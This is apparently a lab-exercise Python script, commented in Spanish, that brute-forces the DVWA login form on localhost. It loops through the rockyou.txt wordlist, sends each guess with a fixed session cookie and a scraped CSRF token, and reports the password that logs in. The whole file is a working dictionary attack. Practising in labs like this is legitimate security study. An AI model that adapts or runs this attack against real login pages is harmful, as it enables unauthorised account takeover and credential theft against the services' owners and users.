import requests
from bs4 import BeautifulSoup

session = requests.Session()
url = "http://localhost:8080/vulnerabilities/brute/"
user = "admin"

cookies = {
    'PHPSESSID' : '0160ecvj6lnpkc4ttn6t2rvi17',
    'security' : 'medium'
}

diccionario_path = 'rockyou.txt'

# Obtenemos el token válido
response = session.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})['value']

with open(diccionario_path, 'r', encoding='latin-1') as file:
    for line in file:
        pwd = line.strip()  # Quitamos saltos de línea

        if not pwd:
            continue

        params = {
            'username' : user,
            'password' : pwd, 
            'Login' : 'Login',
            'user_token' : token
        }

        response = requests.get(url, params=params, cookies=cookies)

        if "Welcome to the password protected area" in response.text:
            print(f"[+] Password encontrada: {pwd}")
            break
        else:
            print(f"[-] Intento fallido: {pwd}")
